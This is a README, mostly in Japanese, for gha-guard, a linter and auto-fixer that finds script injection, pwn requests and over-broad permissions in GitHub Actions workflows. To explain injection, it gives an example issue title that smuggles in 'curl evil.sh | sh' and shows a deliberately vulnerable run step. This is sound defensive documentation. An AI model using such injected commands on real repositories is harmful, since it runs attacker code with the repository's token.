# gha-guard

[![ci](https://github.com/OTA-EITA/gha-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/OTA-EITA/gha-guard/actions/workflows/ci.yml)

GitHub Actions のワークフローに潜む**セキュリティの穴を見つけて、自動で直す** TypeScript 製の CLI / GitHub Action です。
スクリプト注入、pwn request、過剰な権限、SHA で固定されていないアクションなどを検出し、SARIF で Code scanning に載せられます。

A security linter and auto-fixer for GitHub Actions workflows, written in TypeScript: script injection,
pwn requests, excessive token permissions, unpinned actions and more, with SARIF output.

## なぜ作ったか

CI/CD はサプライチェーン攻撃の主要な入口です。たとえば次の 1 行は、Issue のタイトルを `"; curl evil.sh | sh #` にされるだけで、リポジトリのトークンを持ったまま任意のコマンドを実行されます。

```yaml
- run: echo "Thanks for opening: ${{ github.event.issue.title }}"
```

こうした書き方は見た目では問題がなく、レビューでも見落とされがちです。gha-guard はこれを機械的に見つけ、直せるものは直します。

## ルール

| ID     | 重大度       | 内容                                                                                                                                             | 自動修正                                                            |
| ------ | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------- |
| GHA001 | high         | Issue / PR のタイトル・本文、ブランチ名、コミットメッセージなど**攻撃者が決められる値**を `run:` や `actions/github-script` に直接埋め込んでいる | ✅ 環境変数経由に書き換え                                           |
| GHA002 | high         | `pull_request_target` / `workflow_run` で PR のコードを checkout している（pwn request）                                                         |                                                                     |
| GHA003 | medium       | `permissions` がなく、リポジトリ既定（古い設定では読み書き）の権限で動く                                                                         | ✅ `contents: read` を追加                                          |
| GHA004 | high         | `permissions: write-all`                                                                                                                         |                                                                     |
| GHA005 | medium / low | アクションがタグなど書き換え可能な参照で指定されている（サードパーティは medium）                                                                | [depbot](https://github.com/OTA-EITA/depbot) の `--pin-only` で固定 |
| GHA006 | low          | `actions/checkout` がトークンを `.git/config` に残す（`persist-credentials: false` がない）                                                      |                                                                     |
| GHA007 | high         | `ACTIONS_ALLOW_UNSECURE_COMMANDS` で危険な旧コマンドを有効にしている                                                                             |                                                                     |
| GHA008 | medium       | PR をセルフホストランナーで実行している                                                                                                          |                                                                     |
| GHA009 | low          | 再利用ワークフローに `secrets: inherit` で全シークレットを渡している                                                                             |                                                                     |

判定の根拠は GitHub 公式の「Security hardening for GitHub Actions」です。ワークフロー（`.github/workflows/*.yml`）に加えて、Composite Action（`action.yml`）も検査します。

## 使い方

```sh
# インストール（npm）
npm install -g github:OTA-EITA/gha-guard

# リポジトリを検査
gha-guard

# 自動で直す
gha-guard --fix

# SARIF で出力し、high だけで失敗させる
gha-guard --format sarif --fail-on high > gha-guard.sarif
```

出力例（[`test/fixtures/vulnerable`](test/fixtures/vulnerable) に対する実行結果の一部）:

```
.github/workflows/triage.yml:10  HIGH   GHA002  checks out pull request code in a pull_request_target workflow, which has secrets and a write token ("pwn request")
.github/workflows/triage.yml:13  HIGH   GHA001  github.event.issue.title is interpolated into a script; a crafted value can run arbitrary commands [fixable]
.github/workflows/triage.yml:1  MEDIUM GHA003  no permissions block; job(s) label get the repository's default token permissions [fixable]
.github/workflows/triage.yml:21  MEDIUM GHA005  some-org/labeler@main is pinned to a mutable ref; whoever controls the tag controls what runs

4 file(s), 17 finding(s): 8 high, 4 medium, 5 low
```

`--fix` を付けると、次のように書き換わります（変更箇所以外の書式は保ちます）。シェルに合わせて `${VAR}`（bash）、`$env:VAR`（PowerShell）、`%VAR%`（cmd）を使い分け、既存の環境変数とは名前が衝突しないようにします。

```diff
 on:
   issues:
     types: [opened]
   pull_request_target:
+permissions:
+  contents: read
 jobs:
   label:
     steps:
       - name: Greet
         run: |
-          echo "Thanks for opening: ${{ github.event.issue.title }}"
-          echo ${{ github.head_ref }}
+          echo "Thanks for opening: ${ISSUE_TITLE}"
+          echo "${HEAD_REF}"
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          HEAD_REF: ${{ github.head_ref }}
```

| オプション     | 既定値 | 説明                                            |
| -------------- | ------ | ----------------------------------------------- |
| `--fix`        | -      | 自動修正できるものをファイルに書き戻す          |
| `--format`     | `text` | `text` / `json` / `markdown` / `sarif`          |
| `--fail-on`    | `low`  | この重大度以上で終了コード 1（`none` で常に 0） |
| `--list-rules` | -      | ルール一覧                                      |

`testdata` と `fixtures` ディレクトリは検査対象から外します（わざと危険なサンプルを置くことが多いため）。

## GitHub Action として使う

```yaml
permissions:
  contents: read
  security-events: write

jobs:
  gha-guard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          persist-credentials: false
      - uses: OTA-EITA/gha-guard@v0.1.0
        id: guard
        with:
          fail-on: high
      - uses: github/codeql-action/upload-sarif@v4
        if: always()
        with:
          sarif_file: ${{ steps.guard.outputs.sarif-file }}
```

結果は PR の該当行への注釈、ジョブのサマリー、Code scanning のアラートとして表示されます。このリポジトリ自身の CI でも、gha-guard が自分のワークフローを検査しています。

## 開発

TypeScript の strict モードに加えて `noUncheckedIndexedAccess` と `exactOptionalPropertyTypes` を有効にし、typescript-eslint の `strictTypeChecked` で lint しています。

```sh
npm ci
npm run typecheck
npm run lint
npm run coverage   # Vitest、カバレッジのしきい値つき
npm run build      # esbuild で dist/cli.js と dist/action.js を生成
```

CI では、コミットされた `dist/` がソースと一致しているかも確認します。

## License

MIT
